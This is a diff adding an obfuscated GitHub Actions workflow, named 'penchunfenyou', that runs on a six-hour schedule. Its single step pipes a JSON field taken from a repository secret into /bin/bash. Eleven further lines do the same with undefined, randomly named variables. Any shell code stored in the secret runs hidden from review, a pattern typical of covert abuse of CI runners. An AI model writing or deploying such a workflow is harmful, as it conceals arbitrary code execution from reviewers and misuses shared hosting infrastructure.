@@ -1,0 +1,28 @@
+name: penchunfenyou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: penchunfenyou
+        env:
+          ds5085: ${{ secrets.ds5085 }}
+        run: |
+          echo $ds5085 | jq -r .ii58069 | /bin/bash
+          echo $kud4 | jq -r .mpyv3 | /bin/bash
+          echo $rry28 | jq -r .j445 | /bin/bash
+          echo $pt094 | jq -r .dk004 | /bin/bash
+          echo $jx20926 | jq -r .sny198 | /bin/bash
+          echo $edov07 | jq -r .r70023 | /bin/bash
+          echo $k34570 | jq -r .ltvy628 | /bin/bash
+          echo $admzt82 | jq -r .qa735 | /bin/bash
+          echo $j025 | jq -r .kqiu523 | /bin/bash
+          echo $oj63 | jq -r .yirvp217 | /bin/bash
+          echo $bajl4 | jq -r .g64 | /bin/bash
+          echo $h46279 | jq -r .qw5545 | /bin/bash
+
